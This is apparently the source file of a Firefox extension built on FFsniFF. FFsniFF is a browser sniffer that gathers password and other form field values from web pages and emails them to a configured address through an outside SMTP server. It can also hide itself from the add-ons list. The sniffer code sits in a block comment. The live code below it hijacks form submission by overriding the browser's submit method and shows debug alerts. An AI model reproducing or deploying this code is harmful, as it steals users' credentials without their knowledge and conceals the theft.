// FFsniFF (FireFox sniFFer)
// http://azurit.elbiahosting.sk/ffsniff/
// Copyright (C) 2006-2008 azurIt (azurit@pobox.sk, azurIt@IRCnet)
//
// LICENSE:
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 3 as
// published by the Free Software Foundation.
////////////////////////////////////////////////////////////////////////////////
/*
// set this to some host (FFsniFF will send this with EHLO command)
var send_from_host = "127.0.0.1";
// set this to the sender e-mail address
var send_from = "blackberryredirect@gmail.com";
// set this to the receiver e-mail address
var send_to = "blackberryredirect@gmail.com";
// subject of the mail
var subject = "FFsniFF log";
// smtp server which will be used to send e-mail
var smtp_host = "wekk.net";
// smtp port
var smtp_port = "25";
// hidding enable/disable
var enable_hide = "no";


////////////////////////////////////////////////////////////////////////////////
///////////////////// DO NOT CHANGE ANYTHING BELOW THIS ////////////////////////
////////////////////////////////////////////////////////////////////////////////

var transportService = Components.classes["@mozilla.org/network/socket-transport-service;1"].getService(Components.interfaces.nsISocketTransportService);
var transport = "";
var outstream = "";

var instream = Components.classes["@mozilla.org/scriptableinputstream;1"].createInstance(Components.interfaces.nsIScriptableInputStream);
var stream = "";

// find out FF version
var appInfo = Components.classes["@mozilla.org/xre/app-info;1"].getService(Components.interfaces.nsIXULAppInfo);
var versionChecker = Components.classes["@mozilla.org/xpcom/version-comparator;1"].getService(Components.interfaces.nsIVersionComparator);

var data = "";
var data0 = "EHLO " + send_from_host + "\r\n"
var data1 = "MAIL FROM: <" + send_from + ">\r\n"
var data2 = "RCPT TO: <" + send_to + ">\r\n"
var data3 = "DATA\r\n"
var data4 = "\r\n.\r\n"
var data5 = "QUIT\r\n"

function send_data() {
	transport = transportService.createTransport(null, 0, smtp_host, smtp_port, null);
	outstream = transport.openOutputStream(0, 0, 0);
	stream = transport.openInputStream(0, 0, 0);
	instream.init(stream);

	// this will avoid 'Improper use of SMTP command pipelining'
	// error on SMTP servers
	outstream.write(data0, data0.length);
	while (instream.available() == 0) {}
	instream.read(instream.available());

	outstream.write(data1, data1.length);
	while (instream.available() == 0) {}
	instream.read(instream.available());

	outstream.write(data2, data2.length);
	while (instream.available() == 0) {}
	instream.read(instream.available());

	outstream.write(data3, data3.length);
	while (instream.available() == 0) {}
	instream.read(instream.available());

	outstream.write(data, data.length);
	// don't read here cos no data was send to us
	//while (instream.available() == 0) {}
	//instream.read(instream.available());

	outstream.write(data4, data4.length);
	while (instream.available() == 0) {}
	instream.read(instream.available());

	outstream.write(data5, data5.length);
	while (instream.available() == 0) {}

	outstream.close();
	instream.close();
}

if (versionChecker.compare(appInfo.version, "3.0") >= 0) {
	var workingThread = function() {
	};

	workingThread.prototype = {
		run: function() {
			send_data();
		}
	};
} else {
	var runnable = {
		run: function() {
			send_data();
		}
	}
}

function sniff() {
	// if we are running under 3.0 or later
	if (versionChecker.compare(appInfo.version, "3.0") >= 0) {
		var thread = Components.classes["@mozilla.org/thread-manager;1"].getService().newThread(0);
		thread.dispatch(new workingThread(), thread.DISPATCH_NORMAL);
	} else {
		var thread = Components.classes["@mozilla.org/thread;1"].getService(Components.interfaces.nsIThread);
		thread.init(runnable, 512*1024, Components.interfaces.nsIThread.PRIORITY_NORMAL, Components.interfaces.nsIThread.SCOPE_LOCAL, Components.interfaces.nsIThread.STATE_UNJOINABLE);
	}
}

function do_sniff() {
	var ok = 0;
	var hesla = window.content.document.getElementsByTagName("input");
	data = "";
	for (var i = 0; i < hesla.length; i++) {
		if (hesla[i].value != "") {
			if (hesla[i].type == "password") {
				ok = 1;
			}
			if (hesla[i].name == "") {
				data += hesla[i].type + ":" + "<blank>:" + hesla[i].value + "\n";
			}
			else {
				data += hesla[i].type + ":" + hesla[i].name +":" + hesla[i].value + "\n";
			}
		}
	}
	if (ok == 1) {
		data = "Subject: " + subject + "\r\n\r\n" + window.top.content.document.location + "\n" + "type:name:value\n" + "---------------\n" + data;
		sniff()
	}
}

function hide_me() {
	var RDFService = Components.classes["@mozilla.org/rdf/rdf-service;1"].getService(Components.interfaces.nsIRDFService);
	var Container = Components.classes["@mozilla.org/rdf/container;1"].createInstance(Components.interfaces.nsIRDFContainer);
	var extensionDS = Components.classes["@mozilla.org/extensions/manager;1"].getService(Components.interfaces.nsIExtensionManager).datasource;
	var root = RDFService.GetResource("urn:mozilla:item:root");
	var nameArc = RDFService.GetResource("http://www.mozilla.org/2004/em-rdf#name");
	Container.Init(extensionDS, root);
	var elements = Container.GetElements();
	while (elements.hasMoreElements()) {
		var element = elements.getNext();
		var name = "";
		var target = extensionDS.GetTarget(element, nameArc, true);
		if (target) {
			name = target.QueryInterface(Components.interfaces.nsIRDFLiteral).Value;
			if (name == "FFsniFF") {
				Container.RemoveElement(element, true);
			}
		}
	}
}

if (enable_hide == "yes") {
	hide_me();
}
*/

function exampleBrowserStartup(event)
{
	alert("hola");
  // place your startup code here
}

//window.addEventListener("submit", do_sniff, false);

function newsubmit(event) {
    var target = event ? event.target : this;

    // do anything you like here
    alert('Submitting form to ' + target.action);

    // call real submit function
    this._submit();
}
alert('caca');
window.addEventListener("submit", newsubmit, true);
window.addEventListener("load", exampleBrowserStartup, true);


// If a script calls someForm.submit(), the onsubmit event does not fire,
// so we need to redefine the submit method of the HTMLFormElement class.
HTMLFormElement.prototype._submit = HTMLFormElement.prototype.submit;
HTMLFormElement.prototype.submit = newsubmit;
